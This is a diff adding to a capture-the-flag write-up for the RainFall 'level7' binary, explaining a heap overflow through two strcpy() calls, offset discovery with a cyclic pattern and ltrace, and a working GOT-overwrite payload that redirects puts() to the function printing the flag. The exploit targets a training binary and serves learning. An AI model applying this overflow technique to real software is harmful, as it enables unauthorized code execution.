@@ -1,3 +1,13 @@
+This binary needs two arguments as we can see with the two strcpy().
+
+```sh
+  strcpy((char *)puVar1[1],*(char **)(param_2 + 4)); #argv[1], each pointer is worth 4 bytes
+  strcpy((char *)puVar3[1],*(char **)(param_2 + 8)); #argv[2]
+```
+
+By having a quick look into the code in Ghidra, we notice that the flag is fetched by fgets but it writes into a variable called c, and the unused m() calls printf() into this c variable, where there is our password.
+The puts() is useless, so we can change it by doing a **GOT overwrite** so that it calls the m() function instead.
+
 ```
 08048400 <puts@plt>:
  8048400:	ff 25 28 99 04 08    	jmp    *0x8049928
@@ -20,6 +30,29 @@
  8048520:	c3                   	ret  
 ```
 
+The payload follows the pattern:
+```
+./level7 (offset + puts GOT) (m address)
+```
+
+Thanks to a tool https://wiremask.eu/tools/buffer-overflow-pattern-generator/ we can compute the offset:
+```sh
+ltrace ./level7 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag^C
+level7@RainFall:~$ ltrace ./level7 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+__libc_start_main(0x8048521, 2, 0xbffff724, 0x8048610, 0x8048680 <unfinished ...>
+malloc(8)                                        = 0x0804a008
+malloc(8)                                        = 0x0804a018
+malloc(8)                                        = 0x0804a028
+malloc(8)                                        = 0x0804a038
+strcpy(0x0804a018, "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab"...) = 0x0804a018
+strcpy(0x37614136, NULL <unfinished ...>
+--- SIGSEGV (Segmentation fault) ---
++++ killed by SIGSEGV +++
+```
+
+We copy paste 0x37614136, and it gives us an offset of 20.
+
+Therefore, the payload to get the flag is:
 
 ```sh
 ./level7 $(python -c 'print "F" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
